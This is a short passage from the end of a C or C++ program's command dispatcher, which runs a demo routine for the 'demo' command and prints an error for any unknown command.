    if (cmd == "demo")        { do_demo();   return 0; }
    printf("[!] unknown command '%s'\n", argv[1]);
    return 1;
}
